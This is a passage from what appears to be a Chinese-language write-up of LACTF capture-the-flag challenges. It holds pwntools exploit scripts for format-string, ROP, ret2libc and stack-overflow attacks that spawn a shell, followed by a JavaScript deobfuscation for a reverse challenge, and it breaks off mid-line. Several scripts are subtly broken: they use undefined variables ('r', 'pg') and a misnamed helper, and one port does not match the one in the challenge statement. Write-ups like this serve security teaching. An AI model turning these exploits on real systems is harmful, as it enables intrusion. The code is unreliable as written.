class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/4.png"></p><h3 id="redact"><a href="#redact" class="headerlink" title="redact"></a>redact</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code><br>Note: There are multiple optimized implementations of <code>memmove</code> and one is selected at runtime based on available CPU features, meaning that any solution that uses the <code>memmove</code> GOT entry could fail on remote. The challenge is solvable without <code>memmove</code>.</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/5.png"></p><h3 id="gatekeep"><a href="#gatekeep" class="headerlink" title="gatekeep"></a>gatekeep</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>If I gaslight you enough, you won’t be able to get my flag! :)<br><code>nc lac.tf 31121</code><br>Note: The attached binary is the exact same as the one executing on the remote server.</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的签到题<br><img src="/mdimg/lactf/6.png"><br>主函数，调用了<code>check()</code>函数，跟一下<br><img src="/mdimg/lactf/7.png"><br>逻辑也很简单，让猜密码，密码正确就可以<code>print_flag()</code>但是<code>gets()</code>这里有很明显的溢出，可以看到<code>char s1[15]</code>，所以我们只要输入一个大的数就可以直接绕过<code>check()</code>函数，直接cat flag<br><img src="/mdimg/lactf/9.png"></p><h3 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="caterpillar"><a href="#caterpillar" class="headerlink" title="caterpillar"></a>caterpillar</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><p>-<del>-</del>-<del>-</del>[]? -<del>-</del>-<del>-</del>[].</p><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>附件为js文件，简言之可以理解为对flag逐一判断是否等于某个值。图中的 <strong>-~[]</strong> 这样的书写形式很特别，猜测可能代表常量？于是在浏览器console解析，发现可以解析为整数常量。那么思路显而易见，把if中代码改成赋值语句即可。<br><img src="/mdimg/lactf/10.png"><br><img src="/mdimg/lactf/11.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-title class_">Array</span>(<span class="hljs-number">55</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>)<br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = 